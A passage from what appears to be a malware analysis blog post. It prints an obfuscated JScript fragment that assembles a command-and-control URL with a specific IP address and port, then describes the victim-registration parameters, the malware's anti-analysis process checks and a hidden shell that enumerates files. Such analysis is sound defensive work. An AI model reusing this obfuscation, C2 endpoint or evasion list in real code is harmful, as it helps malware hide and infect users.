			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
 {orl_8:'\u0068'}.orl_8+{hich_5:([][[]] + []).fixed().toLowerCase().substr(1,1)}.hich_5+{ud_6:([][[]] + []).fixed().toLowerCase().substr(1,1)}.ud_6+{ar_6:'\u0070'}.ar_6+{he_9:'\u0073'}.he_9+{ta_7:'\u003a'}.ta_7+{vr_4:'\u002f'}.vr_4+{hich_9:'\u002f'}.hich_9+{ith_5:'\u0031'}.ith_5+{hy_8:'\u0038'}.hy_8+{ur_7:'\u0035'}.ur_7+{etLi_8:([][[]] + []+{ine4_9:([][[]] + []+{on_5:([][[]] + []+'.').split([])[9]}.on_5).split([])[9]}.ine4_9).split([])[9]}.etLi_8+{ort_8:'\u0031'}.ort_8+{hat_5:'\u0035'}.hat_5+{orms_4:'\u0039'}.orms_4+{ut_5:([][[]] + []+{ine4_9:([][[]] + []+{on_5:([][[]] + []+'.').split([])[9]}.on_5).split([])[9]}.ine4_9).split([])[9]}.ut_5+{heeT_8:'\u0038'}.heeT_8+{es_5:'\u0032'}.es_5+{pea_4:([][[]] + []+{ine4_9:([][[]] + []+{on_5:([][[]] + []+'.').split([])[9]}.on_5).split([])[9]}.ine4_9).split([])[9]}.pea_4+{or_8:'\u0031'}.or_8+{ist_8:'\u0031'}.ist_8+{ut_9:'\u003a'}.ut_9+{pec_8:'\u0033'}.pec_8+{ive_6:'\u0033'}.ive_6+{emo_8:'\u0033'}.emo_8+{xpe_9:'\u0033'}.xpe_9+{ill_7:'\u002f'}.ill_7+{ich_9:'\u0050'}.ich_9+{owrf_8:'\u002f'}.owrf_8+{ave8_5:([][[]] + []).fixed().toLowerCase().substr(1,1)}.ave8_5+{ain_6:(!'8' || []+[] || 'i')}.ain_6+{ec_7:'\u0070'}.ec_7+{ason_4:'\u0073'}.ason_4+{ost_8:([][[]] + []).fixed().toLowerCase().substr(1,1)}.ost_8+{in_5:(!'x' || []+[] || 'e')}.in_5+{our7_6:([][[]] + []).link().toLowerCase().substr(4,1)}.our7_6+{hi_6:([][[]] + []+{ine4_9:([][[]] + []+{on_5:([][[]] + []+'.').split([])[9]}.on_5).split([])[9]}.ine4_9).split([])[9]}.hi_6+{art_5:'\u0070'}.art_5+{onou_4:'\u0068'}.onou_4+{eeps_4:'\u0070'}.eeps_4+{ark_7:'\u003f'}.ark_7+{mpri_9:'\u0061'}.mpri_9+{he_9:(!'s' || []+[] || 'd')}.he_9+{et_8:(!'s' || []+[] || 'd')}.et_8+{ath9_4:'\u003d'}.ath9_4;[</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f69287a8ad04887236854-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f69287a8ad04887236854-1"><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-v">orl_8</span><span class="crayon-o">:</span><span class="crayon-s">'\u0068'</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">orl_8</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">hich_5</span><span class="crayon-o">:</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">[</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">fixed</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">toLowerCase</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">substr</span><span class="crayon-sy">(</span><span class="crayon-cn">1</span><span class="crayon-sy">,</span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">hich_5</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">ud_6</span><span class="crayon-o">:</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">[</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">fixed</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">toLowerCase</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">substr</span><span class="crayon-sy">(</span><span class="crayon-cn">1</span><span class="crayon-sy">,</span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">ud_6</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">ar_6</span><span class="crayon-o">:</span><span class="crayon-s">'\u0070'</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">ar_6</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">he_9</span><span class="crayon-o">:</span><span class="crayon-s">'\u0073'</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">he_9</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">ta_7</span><span class="crayon-o">:</span><span class="crayon-s">'\u003a'</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">ta_7</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">vr_4</span><span class="crayon-o">:</span><span class="crayon-s">'\u002f'</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">vr_4</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">hich_9</span><span class="crayon-o">:</span><span class="crayon-s">'\u002f'</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">hich_9</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">ith_5</span><span class="crayon-o">:</span><span class="crayon-s">'\u0031'</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">ith_5</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">hy_8</span><span class="crayon-o">:</span><span class="crayon-s">'\u0038'</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">hy_8</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">ur_7</span><span class="crayon-o">:</span><span class="crayon-s">'\u0035'</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">ur_7</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">etLi_8</span><span class="crayon-o">:</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">[</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">ine4_9</span><span class="crayon-o">:</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">[</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">on_5</span><span class="crayon-o">:</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">[</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-o">+</span><span class="crayon-s">'.'</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">split</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">[</span><span class="crayon-cn">9</span><span class="crayon-sy">]</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">on_5</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">split</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">[</span><span class="crayon-cn">9</span><span class="crayon-sy">]</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">ine4_9</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">split</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">[</span><span class="crayon-cn">9</span><span class="crayon-sy">]</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">etLi_8</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">ort_8</span><span class="crayon-o">:</span><span class="crayon-s">'\u0031'</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">ort_8</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">hat_5</span><span class="crayon-o">:</span><span class="crayon-s">'\u0035'</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">hat_5</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">orms_4</span><span class="crayon-o">:</span><span class="crayon-s">'\u0039'</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">orms_4</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">ut_5</span><span class="crayon-o">:</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">[</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">ine4_9</span><span class="crayon-o">:</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">[</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">on_5</span><span class="crayon-o">:</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">[</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-o">+</span><span class="crayon-s">'.'</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">split</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">[</span><span class="crayon-cn">9</span><span class="crayon-sy">]</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">on_5</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">split</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">[</span><span class="crayon-cn">9</span><span class="crayon-sy">]</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">ine4_9</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">split</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">[</span><span class="crayon-cn">9</span><span class="crayon-sy">]</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">ut_5</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">heeT_8</span><span class="crayon-o">:</span><span class="crayon-s">'\u0038'</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">heeT_8</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">es_5</span><span class="crayon-o">:</span><span class="crayon-s">'\u0032'</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">es_5</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">pea_4</span><span class="crayon-o">:</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">[</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">ine4_9</span><span class="crayon-o">:</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">[</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">on_5</span><span class="crayon-o">:</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">[</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-o">+</span><span class="crayon-s">'.'</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">split</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">[</span><span class="crayon-cn">9</span><span class="crayon-sy">]</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">on_5</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">split</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">[</span><span class="crayon-cn">9</span><span class="crayon-sy">]</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">ine4_9</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">split</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">[</span><span class="crayon-cn">9</span><span class="crayon-sy">]</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">pea_4</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">or_8</span><span class="crayon-o">:</span><span class="crayon-s">'\u0031'</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">or_8</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">ist_8</span><span class="crayon-o">:</span><span class="crayon-s">'\u0031'</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">ist_8</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">ut_9</span><span class="crayon-o">:</span><span class="crayon-s">'\u003a'</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">ut_9</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">pec_8</span><span class="crayon-o">:</span><span class="crayon-s">'\u0033'</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">pec_8</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">ive_6</span><span class="crayon-o">:</span><span class="crayon-s">'\u0033'</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">ive_6</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">emo_8</span><span class="crayon-o">:</span><span class="crayon-s">'\u0033'</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">emo_8</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">xpe_9</span><span class="crayon-o">:</span><span class="crayon-s">'\u0033'</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">xpe_9</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">ill_7</span><span class="crayon-o">:</span><span class="crayon-s">'\u002f'</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">ill_7</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">ich_9</span><span class="crayon-o">:</span><span class="crayon-s">'\u0050'</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">ich_9</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">owrf_8</span><span class="crayon-o">:</span><span class="crayon-s">'\u002f'</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">owrf_8</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">ave8_5</span><span class="crayon-o">:</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">[</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">fixed</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">toLowerCase</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">substr</span><span class="crayon-sy">(</span><span class="crayon-cn">1</span><span class="crayon-sy">,</span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">ave8_5</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">ain_6</span><span class="crayon-o">:</span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-s">'8'</span><span class="crayon-h"> </span><span class="crayon-o">||</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-o">+</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">||</span><span class="crayon-h"> </span><span class="crayon-s">'i'</span><span class="crayon-sy">)</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">ain_6</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">ec_7</span><span class="crayon-o">:</span><span class="crayon-s">'\u0070'</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">ec_7</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">ason_4</span><span class="crayon-o">:</span><span class="crayon-s">'\u0073'</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">ason_4</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">ost_8</span><span class="crayon-o">:</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">[</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">fixed</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">toLowerCase</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">substr</span><span class="crayon-sy">(</span><span class="crayon-cn">1</span><span class="crayon-sy">,</span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">ost_8</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">in_5</span><span class="crayon-o">:</span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-s">'x'</span><span class="crayon-h"> </span><span class="crayon-o">||</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-o">+</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">||</span><span class="crayon-h"> </span><span class="crayon-s">'e'</span><span class="crayon-sy">)</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">in_5</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">our7_6</span><span class="crayon-o">:</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">[</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">link</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">toLowerCase</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">substr</span><span class="crayon-sy">(</span><span class="crayon-cn">4</span><span class="crayon-sy">,</span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">our7_6</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">hi_6</span><span class="crayon-o">:</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">[</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">ine4_9</span><span class="crayon-o">:</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">[</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">on_5</span><span class="crayon-o">:</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">[</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-o">+</span><span class="crayon-s">'.'</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">split</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">[</span><span class="crayon-cn">9</span><span class="crayon-sy">]</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">on_5</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">split</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">[</span><span class="crayon-cn">9</span><span class="crayon-sy">]</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">ine4_9</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">split</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">[</span><span class="crayon-cn">9</span><span class="crayon-sy">]</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">hi_6</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">art_5</span><span class="crayon-o">:</span><span class="crayon-s">'\u0070'</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">art_5</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">onou_4</span><span class="crayon-o">:</span><span class="crayon-s">'\u0068'</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">onou_4</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">eeps_4</span><span class="crayon-o">:</span><span class="crayon-s">'\u0070'</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">eeps_4</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">ark_7</span><span class="crayon-o">:</span><span class="crayon-s">'\u003f'</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">ark_7</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">mpri_9</span><span class="crayon-o">:</span><span class="crayon-s">'\u0061'</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">mpri_9</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">he_9</span><span class="crayon-o">:</span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-s">'s'</span><span class="crayon-h"> </span><span class="crayon-o">||</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-o">+</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">||</span><span class="crayon-h"> </span><span class="crayon-s">'d'</span><span class="crayon-sy">)</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">he_9</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">et_8</span><span class="crayon-o">:</span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-s">'s'</span><span class="crayon-h"> </span><span class="crayon-o">||</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-o">+</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">||</span><span class="crayon-h"> </span><span class="crayon-s">'d'</span><span class="crayon-sy">)</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">et_8</span><span class="crayon-o">+</span><span class="crayon-sy">{</span><span class="crayon-v">ath9_4</span><span class="crayon-o">:</span><span class="crayon-s">'\u003d'</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">ath9_4</span><span class="crayon-sy">;</span><span class="crayon-sy">[</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0041 seconds] -->
<p>Additional parameters, as shown in the example below, are later concatenated to this URL to form the HTTP GET request that would be used when connecting to the actors infrastructure to register new victims via unique user ids (uid below) as well as provide additional information about the client, including which version of the malware that infected the victims system allowing the actors to know how many victims are running particular versions of the malware. Using a version identifier in communication code is another behaviour of this malware analogous to a software developer wanting feedback or telemetry about their application being run in the wild.</p>
<ul>
<li>add=3ef295d92702b904d009ba73e42a69c2</li>
<li>uid=1442894259</li>
<li>out=0</li>
<li>ver=20</li>
</ul>
<p>The JSE code continues by enumerating all running processing and checks for matches against the following list of applications and quits if they are found. Clearly the malware does not want to be analysed. The Johnson-PC item below perhaps relates to well-known sandboxes that may use such names for their analysis machines, which the malware is keen to avoid running in.</p>
<p>Procmon<br />
Wireshark<br />
Temp\iexplore.exe<br />
ProcessHacker<br />
vmtools<br />
VBoxService<br />
python<br />
ImmunityDebugger<br />
Johnson-PC<br />
Proxifier.exe</p>
<p>The malware then runs a hidden command shell issuing commands, as shown below, to get a list of files and their full paths where said file extensions match the list described below. The list is redirected to a text file named, in at least one of the versions, as pollos.txt  another reference to Breaking Bad.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f69287a8ad10899728815" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
